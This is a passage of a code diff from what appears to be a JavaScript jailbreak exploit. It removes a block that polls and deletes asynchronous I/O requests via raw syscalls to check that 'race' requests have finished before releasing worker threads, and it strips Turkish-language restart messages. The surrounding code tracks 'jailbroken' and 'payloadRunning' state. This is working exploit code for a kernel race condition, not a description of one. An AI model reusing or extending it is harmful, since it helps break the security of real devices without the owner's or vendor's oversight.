-    let drGate = true;
-    let drGateSt = "";
-    const drGatePoll = sc(SYS.aio_multi_poll, idAd2, NUM, stAd2).i32;
-    for (let k = 0; k < NUM; k++) {
-      const st = stDv2.getUint32(k * 4, true) >>> 0;
-      drGateSt += (k ? "," : "") + st.toString(16);
-      if ((st & 0xffff) < 3 && (st & 0x80000000) === 0) drGate = false;
-    }
-    mark(
-      "PR-GATE",
-      "poll=" +
-        drGatePoll +
-        " ok=" +
-        (drGate ? 1 : 0) +
-        " st=[" +
-        drGateSt +
-        "] rule=every_race_id_terminal_or_gone",
-    );
-
-    if (!drGate) {
-      mark(
-        "PR-DRAIN-SKIPPED",
-        "a race request is still live -- workers NOT released",
-      );
-    } else {
-      const drWr = sc(SYS.write, bsp1, bufAddr(drWbAb), NBLOCK * 0x40).i32;
-      let drSpins = 0;
-      let drDone = 0;
-      for (; drSpins < 200; drSpins++) {
-        sc(SYS.aio_multi_poll, drBidAd, NBLOCK, drStAd);
-        drDone = 0;
-        for (let k = 0; k < NBLOCK; k++)
-          if ((drStDv.getUint32(k * 4, true) & 0xffff) >= 3) drDone++;
-        if (drDone === NBLOCK) break;
-      }
-      let drSt = "";
-      for (let k = 0; k < NBLOCK; k++)
-        drSt +=
-          (k ? "," : "") + (drStDv.getUint32(k * 4, true) >>> 0).toString(16);
-      const drDel = sc(SYS.aio_multi_delete, drBidAd, NBLOCK, drStAd).i32;
-      mark(
-        "PR-DRAIN",
-        "wr=" +
-          drWr +
-          " done=" +
-          drDone +
-          "/" +
-          NBLOCK +
-          " spins=" +
-          drSpins +
-          " st=[" +
-          drSt +
-          "] del=" +
-          drDel,
-      );
-    }
   } catch (e) {
     mark("THREW", e && e.message ? e.message : String(e));
-    state("İşlem sırasında hata oluştu", "bad");
-    try { await adviseRestart("İşlem sırasında hata oluştu"); } catch (eR) {}
+    state("threw", "bad");
   } finally {
     try {
       if (jbRestoreHook) jbRestoreHook("finally");
@@ -4530,11 +3364,6 @@ const pid = sc(SYS.getpid).i32;
     try {
       if (typeof A !== "undefined" && A) A.busy = 0;
     } catch (e) {}
-    try {
-      if (!payloadRunning && !jailbroken && (failCount > 0 || !allDone)) {
-        await adviseRestart("İşlem tamamlanamadı; başarılı=" + passCount + " fail=" + failCount);
-      }
-    } catch (eA) {}
     mark(
       "PROOF-SUMMARY-FINAL",
       "pass=" +
@@ -4544,7 +3373,7 @@ const pid = sc(SYS.getpid).i32;
         (allDone ? "" : "  INCOMPLETE"),
     );
     try {
-      finishUI(finalUIResult === null ? payloadRunning : finalUIResult);
+      finishUI(payloadRunning);
     } catch (eUI) {}
   }
 })();
